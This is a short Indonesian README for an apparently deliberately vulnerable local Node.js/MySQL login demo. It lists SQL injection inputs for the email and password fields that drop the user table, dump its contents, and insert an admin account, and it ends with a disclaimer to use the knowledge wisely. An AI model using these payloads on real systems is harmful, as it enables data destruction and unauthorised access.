# PRE-REQUISITE

- nodejs terinstall
- database mysql terinstall
- extension live server terinstall di code editor (aku pakai vscode)

# INSTALL DEPENDENCY

- buka terminal / command prompt
- lakukan perintah `npm install`
- import database ddos_test.sql ke mysql

# RUN SERVER

- buka terminal / command prompt
- lakukan perintah `npm run dev`
- pastikan port 3000 terbuka (running)

# RUN CLIENT

- masuk ke browser
- ketik `localhost:3000/login`

## CONTOH FIELD INPUT UNTUK MELAKUKAN SERANGAN SQL INJECTION

<!-- ini untuk menghapus table -->

- ### drop tabel
  email: `'; DROP TABLE user; --`
  password: `'; DROP TABLE user; --`

<!-- ini untuk melihat isi table -->

- ### melihat isi tabel
  email: `'; SELECT _ FROM user; --`
  password: `'; SELECT _ FROM user; --`

<!-- ini untuk menambahkan data ke table -->

- ### memasukan data
  email: `'; INSERT INTO user (email, password) VALUES ('admin', 'admin'); --`
  password: `'; INSERT INTO user (email, password) VALUES ('admin', 'admin'); --`

# NOTE!!!

- ### ini hanyalah demonstrasi
- ### tolong gunakan ilmu ini dengan bijak

- ### jangan sembarang melakukan serangan sql injection

### jika ada pertanyaan bisa japri ke watsapp/instagram ("@as.sidik\_")

# TERIMAKASIH SEMOGA BERMANFAAT :(
